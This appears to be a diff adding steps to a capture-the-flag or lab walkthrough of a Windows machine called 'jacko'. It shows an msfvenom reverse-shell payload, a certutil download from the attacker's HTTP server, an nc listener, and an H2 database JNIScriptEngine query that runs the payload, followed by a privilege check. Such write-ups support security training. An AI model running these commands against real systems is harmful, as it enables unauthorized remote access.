@@ -120,4 +120,32 @@ The exploit linked below can be used to run arbitrary commands.
 
 By default, this runs `whoami` which reveals the user to be `jacko\tony`.
 
+I generate a reverse shell payload using msfvenom
+
+- `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.175 LPORT=445 -f exe -o payload.exe`
+
+I then transfer this to the victim machine by spinning up a quick http server with python
+
+- `sudo python3 -m http.server 80`
+
+And using certutil I force the server into requesting the `payload.exe` file.
+
+- `certutil -urlcache -f http://192.168.45.175/payload.exe c://users/tony/payload.exe`
+
+I set up my listener as so:
+
+- `sudo nc -lvnp 445`
+
+Finally I force the server to execute the payload using the following query
+
+```
+CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
+CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("c://users//tony//payload.exe").getInputStream()).useDelimiter("\\Z").next()');
+```
+
+This pops a reverse shell, from there it is easy to find `local.txt` at `C:/Users/Tony/Desktop/local.txt`.
+
+For some reason it is not possible to run many commmands directly, such as `whoami`. 
+After navigating to `System32` it becomes possible to run these commands with their full filenames, thus `whoami.exe`.
+Running `whoami.exe /priv` reveals that `jacko/tony` has the `SeImpersonatePrivilege`.
 
